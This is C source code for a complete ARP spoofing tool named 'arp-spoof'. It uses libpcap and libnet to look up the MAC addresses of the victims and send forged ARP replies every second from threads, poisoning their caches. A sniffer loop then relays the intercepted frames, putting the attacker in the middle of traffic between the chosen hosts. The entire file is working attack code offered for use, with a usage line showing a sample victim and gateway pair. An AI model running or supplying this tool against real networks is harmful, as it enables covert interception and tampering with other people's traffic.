#include <pcap.h>
#include <libnet.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdint.h>

struct ips{
	char sender_mac[6];
	char sender_ip[4];
	char target_mac[6];
	char target_ip[4];
};

struct thread_args{
	char * target_ip;
	char * target_mac;
	char * sender_ip;
	char * sender_mac;
};

char medev[11]={};
uint32_t job_cnt;
struct ips info[3]={};
char my_ip[4]={};
char my_mac[6]={};

pcap_t * handler;

#define PACKET_SIZE 42

void print_mac(char * mac){
	printf("%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void print_ip(char * ip){
	printf("%u.%u.%u.%u\n",ip[0]&0xff,ip[1]&0xff,ip[2]&0xff,ip[3]&0xff);
}

void get_target_mac(char * victim_ip,char * victim_mac){

	struct libnet_ethernet_hdr * eth_hdr = 0;
	char packet_s[PACKET_SIZE+1]={};
	const unsigned char * packet_r=0;
	struct libnet_arp_hdr * arp_hdr;
    
	putchar(10);
	puts("*** getting sender's mac ***");

	eth_hdr = (struct libnet_ethernet_hdr *)packet_s;

	memset(eth_hdr->ether_dhost,'\xff',6);
	memcpy(eth_hdr->ether_shost,my_mac,6);
	eth_hdr->ether_type = htons(ETHERTYPE_ARP);

	arp_hdr = (libnet_arp_hdr *)((char *)eth_hdr + 
		sizeof(struct libnet_ethernet_hdr));

	arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
	arp_hdr->ar_pro = htons(0x0800); //ipv4
	arp_hdr->ar_hln = 6;
	arp_hdr->ar_pln = 4;
	arp_hdr->ar_op = htons(ARPOP_REQUEST);

	struct ips *infos = (struct ips *)((char *)arp_hdr + 
		sizeof(struct libnet_arp_hdr));

	memcpy(infos->sender_mac,my_mac,6);
	memcpy(infos->sender_ip,my_ip,4);
	memcpy(infos->target_mac,victim_mac,6);
	memcpy(infos->target_ip,victim_ip,4);

	if(pcap_sendpacket(handler,(const u_char *)packet_s,42)==-1){
		puts("pcap_sendpacket error");
		exit(1);
	}

	struct pcap_pkthdr pkthdr;
	while(1){
		packet_r = pcap_next(handler,&pkthdr);
		if(packet_r==NULL){
			puts("pcap_next error");
			sleep(1);
			continue;
		}
		eth_hdr = (struct libnet_ethernet_hdr *)packet_r;
		arp_hdr = (libnet_arp_hdr *)((char *)eth_hdr + sizeof(struct libnet_ethernet_hdr));
		infos =(struct ips *)((char *)arp_hdr + sizeof(struct libnet_arp_hdr));
		if((eth_hdr->ether_type == htons(ETHERTYPE_ARP)) && (arp_hdr->ar_op == htons(ARPOP_REPLY)) && !memcmp(infos->sender_ip,victim_ip,4)) 
			break;
	}
	
	infos = (struct ips *)((char *)arp_hdr + sizeof(struct libnet_arp_hdr));

	printf("*** victim's mac address : ");
	print_mac((char *)infos->sender_mac);
    printf("***");
	puts("-----------------------");

	memcpy(victim_mac,infos->sender_mac,6);

}

void *send_fake_reply(void * arg){
	struct libnet_ethernet_hdr * eth_hdr = 0;
	char packet_s[PACKET_SIZE+1]={};
	struct libnet_arp_hdr * arp_hdr;

	struct thread_args * th = (thread_args *)arg;

	eth_hdr = (struct libnet_ethernet_hdr *)packet_s;

	memcpy(eth_hdr->ether_dhost,th->target_mac,6);
	memcpy(eth_hdr->ether_shost,th->sender_mac,6);
	eth_hdr->ether_type = htons(ETHERTYPE_ARP);

	arp_hdr = (libnet_arp_hdr *)((char *)eth_hdr + sizeof(struct libnet_ethernet_hdr));

	arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
	arp_hdr->ar_pro = htons(0x0800); //ipv4
	arp_hdr->ar_hln = 6;
	arp_hdr->ar_pln = 4;
	arp_hdr->ar_op = htons(ARPOP_REPLY);

	struct ips *infos = (struct ips *)((char *)arp_hdr + sizeof(struct libnet_arp_hdr));

	memcpy(infos->sender_mac,th->sender_mac,6);
	memcpy(infos->sender_ip,th->sender_ip,4);
	memcpy(infos->target_mac,th->target_mac,6);
	memcpy(infos->target_ip,th->target_ip,4);

	while(1){
		if(pcap_sendpacket(handler,(const u_char *)packet_s,42)==-1){
			puts("pcap_sendpacket error");
			continue;
		}

		printf("sent reply at : ");
		print_ip(th->target_ip);
		putchar(10);
		sleep(1);
	}
	return 0;
}

void usage(void){
	puts("arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]");
	puts("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
	exit(1);
}

void sniffer(u_char * arg,const struct pcap_pkthdr * pkthdr,const u_char * packet){
	struct libnet_ethernet_hdr * eth_hdr = 0;
	struct libnet_arp_hdr * arp_hdr;

	eth_hdr = (struct libnet_ethernet_hdr *)packet;
	arp_hdr = (libnet_arp_hdr *)((char *)eth_hdr + sizeof(struct libnet_ethernet_hdr));
	struct ips *infos = (struct ips *)((char *)arp_hdr + sizeof(struct libnet_arp_hdr));

	for(int i=0;i<job_cnt;i++){
		if((!memcmp(eth_hdr->ether_shost,info[i].target_mac,6)) && 
			(!memcmp(eth_hdr->ether_dhost,my_mac,6))){
			printf("relay ... ");
			print_ip(info[i].target_ip);
			memcpy(eth_hdr->ether_shost,my_mac,6);
			memcpy(eth_hdr->ether_dhost,info[i].sender_mac,6);
			if(pcap_sendpacket(handler,(const u_char *)packet,pkthdr->len)==-1){
				puts("pcap_sendpacket error");
				break;
			}

		}
	}
}

int main(int argc, char * argv[]){
    
	if(argc<4 || (argc%2 != 0) || argc>8){
		usage();
    }

	job_cnt = (argc/2)-1;
	char * dev = argv[1];
	strncpy(medev,dev,10);
	pcap_if_t * alldevs;

	if (pcap_findalldevs(&alldevs,NULL) != 0){
		puts("pcap_findalldevs error");
		exit(1);
	}

	int tmp=0;

	for(pcap_if_t * i = alldevs; i != NULL; i=i->next){
		if(strcmp(i->name,medev)!=0)continue;

		for(pcap_addr_t * j=i->addresses; j!=NULL; j=j->next){
			if ( (j->addr->sa_family != AF_INET) && (j->addr->sa_family != AF_PACKET))
				continue;

			if (j->addr->sa_family == AF_INET){
				memcpy(my_ip,&((struct sockaddr_in*)j->addr)->sin_addr,4);
				tmp++;
			}else{
				char * mac_addr = (char *)j->addr->sa_data;
				mac_addr += 9;
				memcpy(my_mac, mac_addr, 6);
				tmp++;
			}
			if (tmp==2)break;
		}
		break;
	}

	pcap_freealldevs(alldevs);

	print_ip((char *)my_ip);
	printf("My Mac : ");
	print_mac((char *)my_mac);

	if((handler = pcap_open_live(medev,1000,1,1000,NULL))==NULL){
		puts("pcap_open_live ERROR!");
		exit(1);
	}

	printf("Job Count: %d\n",job_cnt);

	pthread_t thread_t[3];
	struct thread_args th_arg[3];

	for(int i=0;i<job_cnt;i++){
		inet_pton(AF_INET, argv[(i+1)*2], &info[i].sender_ip);
		inet_pton(AF_INET, argv[(i+1)*2+1], &info[i].target_ip);
		get_target_mac(info[i].target_ip,info[i].target_mac);
		get_target_mac(info[i].sender_ip,info[i].sender_mac);
		th_arg[i].target_ip = info[i].target_ip;
		th_arg[i].target_mac = info[i].target_mac;
		th_arg[i].sender_ip = info[i].sender_ip;
		th_arg[i].sender_mac = my_mac;

		pthread_create(&thread_t[i], NULL, &send_fake_reply, (void *)&th_arg[i]);
	}

	int cnt;

	if (pcap_loop(handler,-1,sniffer,(u_char *)&cnt) == -1){
		printf("pcap_loop error!");
		return(2);
	}

	return 0;
}










